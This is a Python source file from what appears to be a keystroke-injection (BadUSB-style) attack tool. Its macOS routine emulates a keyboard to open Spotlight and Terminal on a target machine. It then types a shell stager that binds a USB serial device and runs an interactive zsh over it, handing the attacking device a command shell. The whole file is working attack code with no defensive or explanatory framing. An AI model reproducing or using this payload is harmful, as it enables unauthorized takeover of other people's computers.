import time
from lib.keyboard import Keyboard
from lib.relay import Relay
from lib.logger import Logger

def _on_ready() -> None:
    Logger.success("Connected!")
    print("")

def macos(baud: int = 115200, show_diagnostics: bool = False) -> None:
    kb = Keyboard()
    rl = Relay(on_ready=_on_ready)

    Logger.info("Injecting serial stager on target...")
    session_data = ""
    if show_diagnostics:
        session_data = 'sleep 0.05; printf "[MAC stty] %s\\r\\n" "$(stty -f /dev/fd/3 -a)" >&3; printf "\\r\\n" >&3;'

    payload = (
        '{'
        'p=$(ls /dev/cu.usb* 2>/dev/null|head -n1)||exit;'
        'exec 3<>$p||exit;'
        f'stty -f /dev/fd/3 {baud} raw -echo -ixon -ixoff||:;'
        f'{session_data}'
        '{ zsh -i <&3 >&3 2>&1; printf "__PIRATE_DONE__\\r\\n" >&3; };'
        'exec 3>&- 3<&-'
        '}; exit'
    )
    
    # Launch spotlight
    kb.send("{KEY:GUI+SPACE}")
    time.sleep(0.35)
    
    # Launch terminal
    kb.send("terminal{KEY:ENTER}")
    time.sleep(1.0)

    # Open a new terminal window
    kb.send("{KEY:GUI+n}")
    time.sleep(.5)
    
    # Send the payload
    kb.send(payload)
    kb.send("{KEY:ENTER}")

    Logger.info("Attaching to serial...")
    rl.stdio(baud=baud)
    Logger.info("Session closed.")
    print("")